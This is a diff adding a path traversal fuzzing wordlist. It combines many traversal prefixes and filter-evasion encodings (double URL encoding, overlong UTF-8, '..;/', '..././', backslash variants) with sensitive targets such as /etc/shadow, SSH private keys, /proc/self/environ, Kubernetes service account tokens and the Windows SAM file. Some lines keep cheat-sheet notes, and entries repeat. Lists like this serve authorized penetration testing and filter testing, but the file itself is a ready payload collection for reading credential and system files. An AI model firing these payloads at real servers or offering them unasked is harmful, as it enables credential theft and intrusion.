@@ -1,0 +1,1534 @@
+/../etc/issue
+/../etc/passwd
+/../etc/shadow
+/../etc/group
+/../etc/hosts
+/../etc/motd
+/../etc/mysql/my.cnf
+/../proc/[0-9]*/fd/[0-9]*   (first number is the PID, second is the filedescriptor)
+/../proc/self/environ
+/../proc/version
+/../proc/cmdline
+/../proc/sched_debug
+/../proc/mounts
+/../proc/net/arp
+/../proc/net/route
+/../proc/net/tcp
+/../proc/net/udp
+/../proc/self/cwd/index.php
+/../proc/self/cwd/main.py
+/../home/$USER/.bash_history
+/../home/$USER/.ssh/id_rsa
+/../run/secrets/kubernetes.io/serviceaccount/token
+/../run/secrets/kubernetes.io/serviceaccount/namespace
+/../run/secrets/kubernetes.io/serviceaccount/certificate
+/../var/run/secrets/kubernetes.io/serviceaccount
+/../var/lib/mlocate/mlocate.db
+/../var/lib/mlocate.db
+/../boot.ini
+/../inetpub/logs/logfiles
+/../inetpub/wwwroot/global.asa
+/../inetpub/wwwroot/index.asp
+/../inetpub/wwwroot/web.config
+/../sysprep.inf
+/../sysprep.xml
+/../sysprep/sysprep.inf
+/../sysprep/sysprep.xml
+/../system32/inetsrv/metabase.xml
+/../sysprep.inf
+/../sysprep.xml
+/../sysprep/sysprep.inf
+/../sysprep/sysprep.xml
+/../system volume information/wpsettings.dat
+/../system32/inetsrv/metabase.xml
+/../unattend.txt
+/../unattend.xml
+/../unattended.txt
+/../unattended.xml
+/../windows/repair/sam
+/../windows/repair/system
+/../var/log/apache/access.log
+/../var/log/apache/error.log
+/../var/log/httpd/error_log
+/../usr/local/apache/log/error_log
+/../usr/local/apache2/log/error_log
+/../var/log/nginx/access.log
+/../var/log/nginx/error.log
+/../var/log/vsftpd.log
+/../var/log/sshd.log
+/../var/log/mail
+/../../etc/issue
+/../../etc/passwd
+/../../etc/shadow
+/../../etc/group
+/../../etc/hosts
+/../../etc/motd
+/../../etc/mysql/my.cnf
+/../../proc/[0-9]*/fd/[0-9]*   (first number is the PID, second is the filedescriptor)
+/../../proc/self/environ
+/../../proc/version
+/../../proc/cmdline
+/../../proc/sched_debug
+/../../proc/mounts
+/../../proc/net/arp
+/../../proc/net/route
+/../../proc/net/tcp
+/../../proc/net/udp
+/../../proc/self/cwd/index.php
+/../../proc/self/cwd/main.py
+/../../home/$USER/.bash_history
+/../../home/$USER/.ssh/id_rsa
+/../../run/secrets/kubernetes.io/serviceaccount/token
+/../../run/secrets/kubernetes.io/serviceaccount/namespace
+/../../run/secrets/kubernetes.io/serviceaccount/certificate
+/../../var/run/secrets/kubernetes.io/serviceaccount
+/../../var/lib/mlocate/mlocate.db
+/../../var/lib/mlocate.db
+/../../boot.ini
+/../../inetpub/logs/logfiles
+/../../inetpub/wwwroot/global.asa
+/../../inetpub/wwwroot/index.asp
+/../../inetpub/wwwroot/web.config
+/../../sysprep.inf
+/../../sysprep.xml
+/../../sysprep/sysprep.inf
+/../../sysprep/sysprep.xml
+/../../system32/inetsrv/metabase.xml
+/../../sysprep.inf
+/../../sysprep.xml
+/../../sysprep/sysprep.inf
+/../../sysprep/sysprep.xml
+/../../system volume information/wpsettings.dat
+/../../system32/inetsrv/metabase.xml
+/../../unattend.txt
+/../../unattend.xml
+/../../unattended.txt
+/../../unattended.xml
+/../../windows/repair/sam
+/../../windows/repair/system
+/../../var/log/apache/access.log
+/../../var/log/apache/error.log
+/../../var/log/httpd/error_log
+/../../usr/local/apache/log/error_log
+/../../usr/local/apache2/log/error_log
+/../../var/log/nginx/access.log
+../../../../../../../../../../etc/passwd
+/../../var/log/nginx/error.log
+/../../var/log/vsftpd.log
+/../../var/log/sshd.log
+/../../var/log/mail
+/../../../etc/issue
+/../../../etc/passwd
+/../../../etc/shadow
+/../../../etc/group
+/../../../etc/hosts
+/../../../etc/motd
+/../../../etc/mysql/my.cnf
+/../../../proc/[0-9]*/fd/[0-9]*   (first number is the PID, second is the filedescriptor)
+/../../../proc/self/environ
+/../../../proc/version
+/../../../proc/cmdline
+/../../../proc/sched_debug
+/../../../proc/mounts
+/../../../proc/net/arp
+/../../../proc/net/route
+/../../../proc/net/tcp
+/../../../proc/net/udp
+/../../../proc/self/cwd/index.php
+/../../../proc/self/cwd/main.py
+/../../../home/$USER/.bash_history
+/../../../home/$USER/.ssh/id_rsa
+/../../../run/secrets/kubernetes.io/serviceaccount/token
+/../../../run/secrets/kubernetes.io/serviceaccount/namespace
+/../../../run/secrets/kubernetes.io/serviceaccount/certificate
+/../../../var/run/secrets/kubernetes.io/serviceaccount
+/../../../var/lib/mlocate/mlocate.db
+/../../../var/lib/mlocate.db
+/../../../boot.ini
+/../../../inetpub/logs/logfiles
+/../../../inetpub/wwwroot/global.asa
+/../../../inetpub/wwwroot/index.asp
+/../../../inetpub/wwwroot/web.config
+/../../../sysprep.inf
+/../../../sysprep.xml
+/../../../sysprep/sysprep.inf
+/../../../sysprep/sysprep.xml
+/../../../system32/inetsrv/metabase.xml
+/../../../sysprep.inf
+/../../../sysprep.xml
+/../../../sysprep/sysprep.inf
+/../../../sysprep/sysprep.xml
+/../../../system volume information/wpsettings.dat
+/../../../system32/inetsrv/metabase.xml
+/../../../unattend.txt
+/../../../unattend.xml
+/../../../unattended.txt
+/../../../unattended.xml
+/../../../windows/repair/sam
+/../../../windows/repair/system
+/../../../var/log/apache/access.log
+/../../../var/log/apache/error.log
+/../../../var/log/httpd/error_log
+/../../../usr/local/apache/log/error_log
+/../../../usr/local/apache2/log/error_log
+/../../../var/log/nginx/access.log
+/../../../var/log/nginx/error.log
+/../../../var/log/vsftpd.log
+/../../../var/log/sshd.log
+/../../../var/log/mail
+/../../../../etc/issue
+/../../../../etc/passwd
+/../../../../etc/shadow
+/../../../../etc/group
+/../../../../etc/hosts
+/../../../../etc/motd
+/../../../../etc/mysql/my.cnf
+/../../../../proc/[0-9]*/fd/[0-9]*   (first number is the PID, second is the filedescriptor)
+/../../../../proc/self/environ
+/../../../../proc/version
+/../../../../proc/cmdline
+/../../../../proc/sched_debug
+/../../../../proc/mounts
+/../../../../proc/net/arp
+/../../../../proc/net/route
+/../../../../proc/net/tcp
+/../../../../proc/net/udp
+/../../../../proc/self/cwd/index.php
+/../../../../proc/self/cwd/main.py
+/../../../../home/$USER/.bash_history
+/../../../../home/$USER/.ssh/id_rsa
+/../../../../run/secrets/kubernetes.io/serviceaccount/token
+/../../../../run/secrets/kubernetes.io/serviceaccount/namespace
+/../../../../run/secrets/kubernetes.io/serviceaccount/certificate
+/../../../../var/run/secrets/kubernetes.io/serviceaccount
+/../../../../var/lib/mlocate/mlocate.db
+/../../../../var/lib/mlocate.db
+/../../../../boot.ini
+/../../../../inetpub/logs/logfiles
+/../../../../inetpub/wwwroot/global.asa
+/../../../../inetpub/wwwroot/index.asp
+/../../../../inetpub/wwwroot/web.config
+/../../../../sysprep.inf
+/../../../../sysprep.xml
+/../../../../sysprep/sysprep.inf
+/../../../../sysprep/sysprep.xml
+/../../../../system32/inetsrv/metabase.xml
+/../../../../sysprep.inf
+/../../../../sysprep.xml
+/../../../../sysprep/sysprep.inf
+/../../../../sysprep/sysprep.xml
+/../../../../system volume information/wpsettings.dat
+/../../../../system32/inetsrv/metabase.xml
+/../../../../unattend.txt
+/../../../../unattend.xml
+/../../../../unattended.txt
+/../../../../unattended.xml
+/../../../../windows/repair/sam
+/../../../../windows/repair/system
+/../../../../var/log/apache/access.log
+/../../../../var/log/apache/error.log
+/../../../../var/log/httpd/error_log
+/../../../../usr/local/apache/log/error_log
+/../../../../usr/local/apache2/log/error_log
+/../../../../var/log/nginx/access.log
+/../../../../var/log/nginx/error.log
+/../../../../var/log/vsftpd.log
+/../../../../var/log/sshd.log
+/../../../../var/log/mail
+/../../../../../etc/issue
+/../../../../../etc/passwd
+/../../../../../etc/shadow
+/../../../../../etc/group
+/../../../../../etc/hosts
+/../../../../../etc/motd
+/../../../../../etc/mysql/my.cnf
+/../../../../../proc/[0-9]*/fd/[0-9]*   (first number is the PID, second is the filedescriptor)
+/../../../../../proc/self/environ
+/../../../../../proc/version
+/../../../../../proc/cmdline
+/../../../../../proc/sched_debug
+/../../../../../proc/mounts
+/../../../../../proc/net/arp
+/../../../../../proc/net/route
+/../../../../../proc/net/tcp
+/../../../../../proc/net/udp
+/../../../../../proc/self/cwd/index.php
+/../../../../../proc/self/cwd/main.py
+/../../../../../home/$USER/.bash_history
+/../../../../../home/$USER/.ssh/id_rsa
+/../../../../../run/secrets/kubernetes.io/serviceaccount/token
+/../../../../../run/secrets/kubernetes.io/serviceaccount/namespace
+/../../../../../run/secrets/kubernetes.io/serviceaccount/certificate
+/../../../../../var/run/secrets/kubernetes.io/serviceaccount
+/../../../../../var/lib/mlocate/mlocate.db
+/../../../../../var/lib/mlocate.db
+/../../../../../boot.ini
+/../../../../../inetpub/logs/logfiles
+/../../../../../inetpub/wwwroot/global.asa
+/../../../../../inetpub/wwwroot/index.asp
+/../../../../../inetpub/wwwroot/web.config
+/../../../../../sysprep.inf
+/../../../../../sysprep.xml
+/../../../../../sysprep/sysprep.inf
+/../../../../../sysprep/sysprep.xml
+/../../../../../system32/inetsrv/metabase.xml
+/../../../../../sysprep.inf
+/../../../../../sysprep.xml
+/../../../../../sysprep/sysprep.inf
+/../../../../../sysprep/sysprep.xml
+/../../../../../system volume information/wpsettings.dat
+/../../../../../system32/inetsrv/metabase.xml
+/../../../../../unattend.txt
+/../../../../../unattend.xml
+/../../../../../unattended.txt
+/../../../../../unattended.xml
+/../../../../../windows/repair/sam
+/../../../../../windows/repair/system
+/../../../../../var/log/apache/access.log
+/../../../../../var/log/apache/error.log
+/../../../../../var/log/httpd/error_log
+/../../../../../usr/local/apache/log/error_log
+/../../../../../usr/local/apache2/log/error_log
+/../../../../../var/log/nginx/access.log
+/../../../../../var/log/nginx/error.log
+/../../../../../var/log/vsftpd.log
+/../../../../../var/log/sshd.log
+/../../../../../var/log/mail
+../etc/issue
+../etc/passwd
+../etc/shadow
+../etc/group
+../etc/hosts
+../etc/motd
+../etc/mysql/my.cnf
+../proc/[0-9]*/fd/[0-9]*
+../proc/version
+../proc/cmdline
+../proc/sched_debug
+../proc/mounts
+../proc/net/arp
+../proc/net/route
+../proc/net/tcp
+../proc/net/udp
+../proc/self/cwd/index.php
+../proc/self/cwd/main.py
+../home/$USER/.bash_history
+../home/$USER/.ssh/id_rsa
+../run/secrets/kubernetes.io/serviceaccount/token
+../run/secrets/kubernetes.io/serviceaccount/namespace
+../run/secrets/kubernetes.io/serviceaccount/certificate
+../var/run/secrets/kubernetes.io/serviceaccount
+../var/lib/mlocate/mlocate.db
+../var/lib/mlocate.db
+../boot.ini
+../inetpub/logs/logfiles
+../inetpub/wwwroot/global.asa
+../inetpub/wwwroot/index.asp
+../inetpub/wwwroot/web.config
+../sysprep.inf
+../sysprep.xml
+../sysprep/sysprep.inf
+../sysprep/sysprep.xml
+../system32/inetsrv/metabase.xml
+../sysprep.inf
+../sysprep.xml
+../sysprep/sysprep.inf
+../sysprep/sysprep.xml
+../system volume information/wpsettings.dat
+../system32/inetsrv/metabase.xml
+../unattend.txt
+../unattend.xml
+../unattended.txt
+../unattended.xml
+../windows/repair/sam
+../windows/repair/system
+../var/log/apache/access.log
+../var/log/apache/error.log
+../var/log/httpd/error_log
+../usr/local/apache/log/error_log
+../usr/local/apache2/log/error_log
+../var/log/nginx/access.log
+../var/log/nginx/error.log
+../var/log/vsftpd.log
+../var/log/sshd.log
+../var/log/mail
+////////../..//etc/issue
+////////../..//etc/passwd
+////////../..//etc/shadow
+////////../..//etc/group
+////////../..//etc/hosts
+////////../..//etc/motd
+////////../..//etc/mysql/my.cnf
+////////../..//proc/[0-9]*/fd/[0-9]*   (first number is the PID, second is the filedescriptor)
+////////../..//proc/self/environ
+////////../..//proc/version
+////////../..//proc/cmdline
+////////../..//proc/sched_debug
+////////../..//proc/mounts
+////////../..//proc/net/arp
+////////../..//proc/net/route
+////////../..//proc/net/tcp
+////////../..//proc/net/udp
+////////../..//proc/self/cwd/index.php
+////////../..//proc/self/cwd/main.py
+////////../..//home/$USER/.bash_history
+////////../..//home/$USER/.ssh/id_rsa
+////////../..//run/secrets/kubernetes.io/serviceaccount/token
+////////../..//run/secrets/kubernetes.io/serviceaccount/namespace
+////////../..//run/secrets/kubernetes.io/serviceaccount/certificate
+////////../..//var/run/secrets/kubernetes.io/serviceaccount
+////////../..//var/lib/mlocate/mlocate.db
+////////../..//var/lib/mlocate.db
+////////../..//boot.ini
+////////../..//inetpub/logs/logfiles
+////////../..//inetpub/wwwroot/global.asa
+////////../..//inetpub/wwwroot/index.asp
+////////../..//inetpub/wwwroot/web.config
+////////../..//sysprep.inf
+////////../..//sysprep.xml
+////////../..//sysprep/sysprep.inf
+////////../..//sysprep/sysprep.xml
+////////../..//system32/inetsrv/metabase.xml
+////////../..//sysprep.inf
+////////../..//sysprep.xml
+////////../..//sysprep/sysprep.inf
+////////../..//sysprep/sysprep.xml
+////////../..//system volume information/wpsettings.dat
+////////../..//system32/inetsrv/metabase.xml
+////////../..//unattend.txt
+////////../..//unattend.xml
+////////../..//unattended.txt
+////////../..//unattended.xml
+////////../..//windows/repair/sam
+////////../..//windows/repair/system
+////////../..//var/log/apache/access.log
+////////../..//var/log/apache/error.log
+////////../..//var/log/httpd/error_log
+////////../..//usr/local/apache/log/error_log
+////////../..//usr/local/apache2/log/error_log
+////////../..//var/log/nginx/access.log
+////////../..//var/log/nginx/error.log
+////////../..//var/log/vsftpd.log
+////////../..//var/log/sshd.log
+////////../..//var/log/mail
+/ = %252f/etc/issue
+/ = %252f/etc/passwd
+/ = %252f/etc/shadow
+/ = %252f/etc/group
+/ = %252f/etc/hosts
+/ = %252f/etc/motd
+/ = %252f/etc/mysql/my.cnf
+/ = %252f/proc/[0-9]*/fd/[0-9]*   (first number is the PID, second is the filedescriptor)
+/ = %252f/proc/self/environ
+/ = %252f/proc/version
+/ = %252f/proc/cmdline
+/ = %252f/proc/sched_debug
+/ = %252f/proc/mounts
+/ = %252f/proc/net/arp
+/ = %252f/proc/net/route
+/ = %252f/proc/net/tcp
+/ = %252f/proc/net/udp
+/ = %252f/proc/self/cwd/index.php
+/ = %252f/proc/self/cwd/main.py
+/ = %252f/home/$USER/.bash_history
+/ = %252f/home/$USER/.ssh/id_rsa
+/ = %252f/run/secrets/kubernetes.io/serviceaccount/token
+/ = %252f/run/secrets/kubernetes.io/serviceaccount/namespace
+/ = %252f/run/secrets/kubernetes.io/serviceaccount/certificate
+/ = %252f/var/run/secrets/kubernetes.io/serviceaccount
+/ = %252f/var/lib/mlocate/mlocate.db
+/ = %252f/var/lib/mlocate.db
+/ = %252f/boot.ini
+/ = %252f/inetpub/logs/logfiles
+/ = %252f/inetpub/wwwroot/global.asa
+/ = %252f/inetpub/wwwroot/index.asp
+/ = %252f/inetpub/wwwroot/web.config
+/ = %252f/sysprep.inf
+/ = %252f/sysprep.xml
+/ = %252f/sysprep/sysprep.inf
+/ = %252f/sysprep/sysprep.xml
+/ = %252f/system32/inetsrv/metabase.xml
+/ = %252f/sysprep.inf
+/ = %252f/sysprep.xml
+/ = %252f/sysprep/sysprep.inf
+/ = %252f/sysprep/sysprep.xml
+/ = %252f/system volume information/wpsettings.dat
+/ = %252f/system32/inetsrv/metabase.xml
+/ = %252f/unattend.txt
+/ = %252f/unattend.xml
+/ = %252f/unattended.txt
+/ = %252f/unattended.xml
+/ = %252f/windows/repair/sam
+/ = %252f/windows/repair/system
+/ = %252f/var/log/apache/access.log
+/ = %252f/var/log/apache/error.log
+/ = %252f/var/log/httpd/error_log
+/ = %252f/usr/local/apache/log/error_log
+/ = %252f/usr/local/apache2/log/error_log
+/ = %252f/var/log/nginx/access.log
+/ = %252f/var/log/nginx/error.log
+/ = %252f/var/log/vsftpd.log
+/ = %252f/var/log/sshd.log
+/ = %252f/var/log/mail
+. = %252e/etc/issue
+. = %252e/etc/passwd
+. = %252e/etc/shadow
+. = %252e/etc/group
+. = %252e/etc/hosts
+. = %252e/etc/motd
+. = %252e/etc/mysql/my.cnf
+. = %252e/proc/[0-9]*/fd/[0-9]*   (first number is the PID, second is the filedescriptor)
+. = %252e/proc/self/environ
+. = %252e/proc/version
+. = %252e/proc/cmdline
+. = %252e/proc/sched_debug
+. = %252e/proc/mounts
+. = %252e/proc/net/arp
+. = %252e/proc/net/route
+. = %252e/proc/net/tcp
+. = %252e/proc/net/udp
+. = %252e/proc/self/cwd/index.php
+. = %252e/proc/self/cwd/main.py
+. = %252e/home/$USER/.bash_history
+. = %252e/home/$USER/.ssh/id_rsa
+. = %252e/run/secrets/kubernetes.io/serviceaccount/token
+. = %252e/run/secrets/kubernetes.io/serviceaccount/namespace
+. = %252e/run/secrets/kubernetes.io/serviceaccount/certificate
+. = %252e/var/run/secrets/kubernetes.io/serviceaccount
+. = %252e/var/lib/mlocate/mlocate.db
+. = %252e/var/lib/mlocate.db
+. = %252e/boot.ini
+. = %252e/inetpub/logs/logfiles
+. = %252e/inetpub/wwwroot/global.asa
+. = %252e/inetpub/wwwroot/index.asp
+. = %252e/inetpub/wwwroot/web.config
+. = %252e/sysprep.inf
+. = %252e/sysprep.xml
+. = %252e/sysprep/sysprep.inf
+. = %252e/sysprep/sysprep.xml
+. = %252e/system32/inetsrv/metabase.xml
+. = %252e/sysprep.inf
+. = %252e/sysprep.xml
+. = %252e/sysprep/sysprep.inf
+. = %252e/sysprep/sysprep.xml
+. = %252e/system volume information/wpsettings.dat
+. = %252e/system32/inetsrv/metabase.xml
+. = %252e/unattend.txt
+. = %252e/unattend.xml
+. = %252e/unattended.txt
+. = %252e/unattended.xml
+. = %252e/windows/repair/sam
+. = %252e/windows/repair/system
+. = %252e/var/log/apache/access.log
+. = %252e/var/log/apache/error.log
+. = %252e/var/log/httpd/error_log
+. = %252e/usr/local/apache/log/error_log
+. = %252e/usr/local/apache2/log/error_log
+. = %252e/var/log/nginx/access.log
+. = %252e/var/log/nginx/error.log
+. = %252e/var/log/vsftpd.log
+. = %252e/var/log/sshd.log
+. = %252e/var/log/mail
+..\etc/issue
+..\etc/passwd
+..\etc/shadow
+..\etc/group
+..\etc/hosts
+..\etc/motd
+..\etc/mysql/my.cnf
+..\proc/[0-9]*/fd/[0-9]*   (first number is the PID, second is the filedescriptor)
+..\proc/self/environ
+..\proc/version
+..\proc/cmdline
+..\proc/sched_debug
+..\proc/mounts
+..\proc/net/arp
+..\proc/net/route
+..\proc/net/tcp
+..\proc/net/udp
+..\proc/self/cwd/index.php
+..\proc/self/cwd/main.py
+..\home/$USER/.bash_history
+..\home/$USER/.ssh/id_rsa
+..\run/secrets/kubernetes.io/serviceaccount/token
+..\run/secrets/kubernetes.io/serviceaccount/namespace
+..\run/secrets/kubernetes.io/serviceaccount/certificate
+..\var/run/secrets/kubernetes.io/serviceaccount
+..\var/lib/mlocate/mlocate.db
+..\var/lib/mlocate.db
+..\boot.ini
+..\inetpub/logs/logfiles
+..\inetpub/wwwroot/global.asa
+..\inetpub/wwwroot/index.asp
+..\inetpub/wwwroot/web.config
+..\sysprep.inf
+..\sysprep.xml
+..\sysprep/sysprep.inf
+..\sysprep/sysprep.xml
+..\system32/inetsrv/metabase.xml
+..\sysprep.inf
+..\sysprep.xml
+..\sysprep/sysprep.inf
+..\sysprep/sysprep.xml
+..\system volume information/wpsettings.dat
+..\system32/inetsrv/metabase.xml
+..\unattend.txt
+..\unattend.xml
+..\unattended.txt
+..\unattended.xml
+..\windows/repair/sam
+..\windows/repair/system
+..\var/log/apache/access.log
+..\var/log/apache/error.log
+..\var/log/httpd/error_log
+..\usr/local/apache/log/error_log
+..\usr/local/apache2/log/error_log
+..\var/log/nginx/access.log
+..\var/log/nginx/error.log
+..\var/log/vsftpd.log
+..\var/log/sshd.log
+..\var/log/mail
+..\/etc/issue
+..\/etc/passwd
+..\/etc/shadow
+..\/etc/group
+..\/etc/hosts
+..\/etc/motd
+..\/etc/mysql/my.cnf
+..\/proc/[0-9]*/fd/[0-9]*   (first number is the PID, second is the filedescriptor)
+..\/proc/self/environ
+..\/proc/version
+..\/proc/cmdline
+..\/proc/sched_debug
+..\/proc/mounts
+..\/proc/net/arp
+..\/proc/net/route
+..\/proc/net/tcp
+..\/proc/net/udp
+..\/proc/self/cwd/index.php
+..\/proc/self/cwd/main.py
+..\/home/$USER/.bash_history
+..\/home/$USER/.ssh/id_rsa
+..\/run/secrets/kubernetes.io/serviceaccount/token
+..\/run/secrets/kubernetes.io/serviceaccount/namespace
+..\/run/secrets/kubernetes.io/serviceaccount/certificate
+..\/var/run/secrets/kubernetes.io/serviceaccount
+..\/var/lib/mlocate/mlocate.db
+..\/var/lib/mlocate.db
+..\/boot.ini
+..\/inetpub/logs/logfiles
+..\/inetpub/wwwroot/global.asa
+..\/inetpub/wwwroot/index.asp
+..\/inetpub/wwwroot/web.config
+..\/sysprep.inf
+..\/sysprep.xml
+..\/sysprep/sysprep.inf
+..\/sysprep/sysprep.xml
+..\/system32/inetsrv/metabase.xml
+..\/sysprep.inf
+..\/sysprep.xml
+..\/sysprep/sysprep.inf
+..\/sysprep/sysprep.xml
+..\/system volume information/wpsettings.dat
+..\/system32/inetsrv/metabase.xml
+..\/unattend.txt
+..\/unattend.xml
+..\/unattended.txt
+..\/unattended.xml
+..\/windows/repair/sam
+..\/windows/repair/system
+..\/var/log/apache/access.log
+..\/var/log/apache/error.log
+..\/var/log/httpd/error_log
+..\/usr/local/apache/log/error_log
+..\/usr/local/apache2/log/error_log
+..\/var/log/nginx/access.log
+..\/var/log/nginx/error.log
+..\/var/log/vsftpd.log
+..\/var/log/sshd.log
+..\/var/log/mail
+..;/etc/issue
+..;/etc/passwd
+..;/etc/shadow
+..;/etc/group
+..;/etc/hosts
+..;/etc/motd
+..;/etc/mysql/my.cnf
+..;/proc/[0-9]*/fd/[0-9]*   (first number is the PID, second is the filedescriptor)
+..;/proc/self/environ
+..;/proc/version
+..;/proc/cmdline
+..;/proc/sched_debug
+..;/proc/mounts
+..;/proc/net/arp
+..;/proc/net/route
+..;/proc/net/tcp
+..;/proc/net/udp
+..;/proc/self/cwd/index.php
+..;/proc/self/cwd/main.py
+..;/home/$USER/.bash_history
+..;/home/$USER/.ssh/id_rsa
+..;/run/secrets/kubernetes.io/serviceaccount/token
+..;/run/secrets/kubernetes.io/serviceaccount/namespace
+..;/run/secrets/kubernetes.io/serviceaccount/certificate
+..;/var/run/secrets/kubernetes.io/serviceaccount
+..;/var/lib/mlocate/mlocate.db
+..;/var/lib/mlocate.db
+..;/boot.ini
+..;/inetpub/logs/logfiles
+..;/inetpub/wwwroot/global.asa
+..;/inetpub/wwwroot/index.asp
+..;/inetpub/wwwroot/web.config
+..;/sysprep.inf
+..;/sysprep.xml
+..;/sysprep/sysprep.inf
+..;/sysprep/sysprep.xml
+..;/system32/inetsrv/metabase.xml
+..;/sysprep.inf
+..;/sysprep.xml
+..;/sysprep/sysprep.inf
+..;/sysprep/sysprep.xml
+..;/system volume information/wpsettings.dat
+..;/system32/inetsrv/metabase.xml
+..;/unattend.txt
+..;/unattend.xml
+..;/unattended.txt
+..;/unattended.xml
+..;/windows/repair/sam
+..;/windows/repair/system
+..;/var/log/apache/access.log
+..;/var/log/apache/error.log
+..;/var/log/httpd/error_log
+..;/usr/local/apache/log/error_log
+..;/usr/local/apache2/log/error_log
+..;/var/log/nginx/access.log
+..;/var/log/nginx/error.log
+..;/var/log/vsftpd.log
+..;/var/log/sshd.log
+..;/var/log/mail
+...\.\etc/issue
+...\.\etc/passwd
+...\.\etc/shadow
+...\.\etc/group
+...\.\etc/hosts
+...\.\etc/motd
+...\.\etc/mysql/my.cnf
+...\.\proc/[0-9]*/fd/[0-9]*   (first number is the PID, second is the filedescriptor)
+...\.\proc/self/environ
+...\.\proc/version
+...\.\proc/cmdline
+...\.\proc/sched_debug
+...\.\proc/mounts
+...\.\proc/net/arp
+...\.\proc/net/route
+...\.\proc/net/tcp
+...\.\proc/net/udp
+...\.\proc/self/cwd/index.php
+...\.\proc/self/cwd/main.py
+...\.\home/$USER/.bash_history
+...\.\home/$USER/.ssh/id_rsa
+...\.\run/secrets/kubernetes.io/serviceaccount/token
+...\.\run/secrets/kubernetes.io/serviceaccount/namespace
+...\.\run/secrets/kubernetes.io/serviceaccount/certificate
+...\.\var/run/secrets/kubernetes.io/serviceaccount
+...\.\var/lib/mlocate/mlocate.db
+...\.\var/lib/mlocate.db
+...\.\boot.ini
+...\.\inetpub/logs/logfiles
+...\.\inetpub/wwwroot/global.asa
+...\.\inetpub/wwwroot/index.asp
+...\.\inetpub/wwwroot/web.config
+...\.\sysprep.inf
+...\.\sysprep.xml
+...\.\sysprep/sysprep.inf
+...\.\sysprep/sysprep.xml
+...\.\system32/inetsrv/metabase.xml
+...\.\sysprep.inf
+...\.\sysprep.xml
+...\.\sysprep/sysprep.inf
+...\.\sysprep/sysprep.xml
+...\.\system volume information/wpsettings.dat
+...\.\system32/inetsrv/metabase.xml
+...\.\unattend.txt
+...\.\unattend.xml
+...\.\unattended.txt
+...\.\unattended.xml
+...\.\windows/repair/sam
+...\.\windows/repair/system
+...\.\var/log/apache/access.log
+...\.\var/log/apache/error.log
+...\.\var/log/httpd/error_log
+...\.\usr/local/apache/log/error_log
+...\.\usr/local/apache2/log/error_log
+...\.\var/log/nginx/access.log
+...\.\var/log/nginx/error.log
+...\.\var/log/vsftpd.log
+...\.\var/log/sshd.log
+...\.\var/log/mail
+..././etc/issue
+..././etc/passwd
+..././etc/shadow
+..././etc/group
+..././etc/hosts
+..././etc/motd
+..././etc/mysql/my.cnf
+..././proc/[0-9]*/fd/[0-9]*   (first number is the PID, second is the filedescriptor)
+..././proc/self/environ
+..././proc/version
+..././proc/cmdline
+..././proc/sched_debug
+..././proc/mounts
+..././proc/net/arp
+..././proc/net/route
+..././proc/net/tcp
+..././proc/net/udp
+..././proc/self/cwd/index.php
+..././proc/self/cwd/main.py
+..././home/$USER/.bash_history
+..././home/$USER/.ssh/id_rsa
+..././run/secrets/kubernetes.io/serviceaccount/token
+..././run/secrets/kubernetes.io/serviceaccount/namespace
+..././run/secrets/kubernetes.io/serviceaccount/certificate
+..././var/run/secrets/kubernetes.io/serviceaccount
+..././var/lib/mlocate/mlocate.db
+..././var/lib/mlocate.db
+..././boot.ini
+..././inetpub/logs/logfiles
+..././inetpub/wwwroot/global.asa
+..././inetpub/wwwroot/index.asp
+..././inetpub/wwwroot/web.config
+..././sysprep.inf
+..././sysprep.xml
+..././sysprep/sysprep.inf
+..././sysprep/sysprep.xml
+..././system32/inetsrv/metabase.xml
+..././sysprep.inf
+..././sysprep.xml
+..././sysprep/sysprep.inf
+..././sysprep/sysprep.xml
+..././system volume information/wpsettings.dat
+..././system32/inetsrv/metabase.xml
+..././unattend.txt
+..././unattend.xml
+..././unattended.txt
+..././unattended.xml
+..././windows/repair/sam
+..././windows/repair/system
+..././var/log/apache/access.log
+..././var/log/apache/error.log
+..././var/log/httpd/error_log
+..././usr/local/apache/log/error_log
+..././usr/local/apache2/log/error_log
+..././var/log/nginx/access.log
+..././var/log/nginx/error.log
+..././var/log/vsftpd.log
+..././var/log/sshd.log
+..././var/log/mail
+\ = %c0%5c, %c0%80%5c/etc/issue
+\ = %c0%5c, %c0%80%5c/etc/passwd
+\ = %c0%5c, %c0%80%5c/etc/shadow
+\ = %c0%5c, %c0%80%5c/etc/group
+\ = %c0%5c, %c0%80%5c/etc/hosts
+\ = %c0%5c, %c0%80%5c/etc/motd
+\ = %c0%5c, %c0%80%5c/etc/mysql/my.cnf
+\ = %c0%5c, %c0%80%5c/proc/[0-9]*/fd/[0-9]*   (first number is the PID, second is the filedescriptor)
+\ = %c0%5c, %c0%80%5c/proc/self/environ
+\ = %c0%5c, %c0%80%5c/proc/version
+\ = %c0%5c, %c0%80%5c/proc/cmdline
+\ = %c0%5c, %c0%80%5c/proc/sched_debug
+\ = %c0%5c, %c0%80%5c/proc/mounts
+\ = %c0%5c, %c0%80%5c/proc/net/arp
+\ = %c0%5c, %c0%80%5c/proc/net/route
+\ = %c0%5c, %c0%80%5c/proc/net/tcp
+\ = %c0%5c, %c0%80%5c/proc/net/udp
+\ = %c0%5c, %c0%80%5c/proc/self/cwd/index.php
+\ = %c0%5c, %c0%80%5c/proc/self/cwd/main.py
+\ = %c0%5c, %c0%80%5c/home/$USER/.bash_history
+\ = %c0%5c, %c0%80%5c/home/$USER/.ssh/id_rsa
+\ = %c0%5c, %c0%80%5c/run/secrets/kubernetes.io/serviceaccount/token
+\ = %c0%5c, %c0%80%5c/run/secrets/kubernetes.io/serviceaccount/namespace
+\ = %c0%5c, %c0%80%5c/run/secrets/kubernetes.io/serviceaccount/certificate
+\ = %c0%5c, %c0%80%5c/var/run/secrets/kubernetes.io/serviceaccount
+\ = %c0%5c, %c0%80%5c/var/lib/mlocate/mlocate.db
+\ = %c0%5c, %c0%80%5c/var/lib/mlocate.db
+\ = %c0%5c, %c0%80%5c/boot.ini
+\ = %c0%5c, %c0%80%5c/inetpub/logs/logfiles
+\ = %c0%5c, %c0%80%5c/inetpub/wwwroot/global.asa
+\ = %c0%5c, %c0%80%5c/inetpub/wwwroot/index.asp
+\ = %c0%5c, %c0%80%5c/inetpub/wwwroot/web.config
+\ = %c0%5c, %c0%80%5c/sysprep.inf
+\ = %c0%5c, %c0%80%5c/sysprep.xml
+\ = %c0%5c, %c0%80%5c/sysprep/sysprep.inf
+\ = %c0%5c, %c0%80%5c/sysprep/sysprep.xml
+\ = %c0%5c, %c0%80%5c/system32/inetsrv/metabase.xml
+\ = %c0%5c, %c0%80%5c/sysprep.inf
+\ = %c0%5c, %c0%80%5c/sysprep.xml
+\ = %c0%5c, %c0%80%5c/sysprep/sysprep.inf
